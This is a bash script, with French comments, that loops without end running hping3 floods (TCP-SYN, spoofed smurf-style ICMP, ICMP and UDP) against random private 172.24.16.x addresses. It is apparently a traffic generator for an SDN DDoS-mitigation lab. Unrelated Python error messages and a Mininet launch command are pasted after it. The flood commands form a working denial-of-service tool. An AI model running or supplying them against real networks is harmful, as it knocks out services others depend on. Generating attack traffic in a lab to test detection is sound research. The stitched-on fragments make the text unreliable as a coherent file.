#!/bin/bash

iterations=10  # Nombre d'itérations

while true; do
    for ((i = 0; i < $iterations; i++)); do
        echo "*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*"
        echo "*    $((i + 1))    *          Itération num : $((i + 1))        *   $((i + 1))         *"
        echo "*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*"

        dst_ip=$(python3 - <<END
import random

def ip_generator():
    ip = ".".join(["172", "24", "16", str(random.randint(1, 19))])
    return ip

print(ip_generator())
END
)



        echo "*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*"
        echo -e "              Exécution d'une inondation TCP-SYN               "
        echo "*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*"

        timeout 5s hping3 -S -V -d 120 -w 64 -p 80 --flood "$dst_ip"
        sleep 5

        echo "*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*"
        echo -e "              Exécution d'une inondation SMURF               "
        echo "*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*"

        timeout 5s hping3 -1 -V -d 120 -w 64 -p 80 -a "$dst_ip" "$dst_ip"
        sleep 5

        echo "*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*"
        echo -e "              Exécution d'une inondation ICMP               \n"
        echo "*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*"

        timeout 5s hping3 -1 -V -d 120 -w 64 -p 80 --flood "$dst_ip"
        sleep 5

        echo "*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*"
        echo -e "              Exécution d'une inondation UDP               \n"
        echo "*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*"

        timeout 5s hping3 -2 -V -d 120 -w 64 -p 80 --flood "$dst_ip"
        sleep 5
    done
done


An error occurred: stat: path should be string, bytes, os.PathLike or integer, not DataFrame
An error occurred: stat: path should be string, bytes, os.PathLike or integer, not DataFrame

File "/home/controleur/scripts/Mitigation.py", line 15, in <module>
    from sklearn.externals import joblib
ImportError: cannot import name 'joblib' from 'sklearn.externals' (/usr/local/lib/python3.8/dist-packages/sklearn/externals/__init__.py


 sudo mn -c && sudo mn  --custom sflow-rt/extras/sflow.py --controller=remote,ip=192.168.1.6:6653 --mac --switch=ovsk,protocols=OpenFlow13 --topo=linear,2,3

